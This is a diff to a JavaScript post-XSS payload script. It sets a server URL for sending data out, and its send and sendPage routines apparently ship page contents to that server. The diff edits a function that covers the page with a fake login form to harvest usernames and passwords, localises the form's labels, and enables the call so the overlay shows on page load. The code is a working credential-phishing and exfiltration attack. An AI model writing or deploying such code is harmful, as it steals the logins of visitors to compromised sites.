@@ -1,4 +1,4 @@
-const server = 'https://myserverhere/'
+const server = 'https://myserver/'
 const tag = 'postxss_'
 
 const send = async (info, value) => {
@@ -97,32 +97,32 @@ locationUrls.forEach(url => sendPage(url))
 
 //sendPage('http://url/image.png')
 
-const displayAutenticationPage = (language = 'pt') => {
+const displayAuthenticationPage = (language = 'pt') => {
     if (alreadySent('creds')) {
         return
     }
     let words = []
     if (language.toLowerCase().includes('pt')) {
         words = [
-            'senha',
-            'credenciais incorretas, tente novamente!'
+            'Usu&#xe1;rio',
+            'Senha'
         ]
     } else {
         words = [
-            'password',
-            'incorrect credentials, try again!'
+            'User',
+            'Password'
         ]
     }
     const div = document.createElement("div")
     div.innerHTML = `
     <div style="width: 100%;height: 100%;background-color: #eee;position: absolute;left: 0;top: 0;">
         <div class="login-page" style="width: 360px;padding: 8% 0 0;margin: auto;">
-            <div class="form" style="position: relative;z-index: 1;background: #FFFFFF;max-width: 360px;margin: 0 auto 100px;padding: 45px;text-align: center;box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);">
+            <div class="form" style="position: relative;z-index: 1;background: #FFFFFF;max-width: 360px;margin: 0 auto 100px;padding: 45px; padding-bottom: 10px;text-align: center;box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);">
                 <div id="login-form">
-                    <input id="login" type="text" placeholder="login" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
-                    <input id="password" type="password" onkeypress="return OnEnter(event)" placeholder="${words[0]}" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
-                    <button id="button">login</button>
-                    <h5 id="msg" style="visibility: hidden;"> ${words[1]} </h5>
+                    <input id="login" type="text" placeholder="${words[0]}" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
+                    <input id="password" type="password" onkeypress="return OnEnter(event)" placeholder="${words[1]}" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
+                    <button style="margin-top: 10px;" id="button">Login</button>
+                    <h5 id="msg" style="visibility: hidden;"></h5>
                 </form>
             </div>
         </div>
@@ -149,4 +149,4 @@ function OnEnter(e) {
     }
 }
 var userLang = navigator.language || navigator.userLanguage
-//displayAutenticationPage(userLang)
+displayAuthenticationPage()
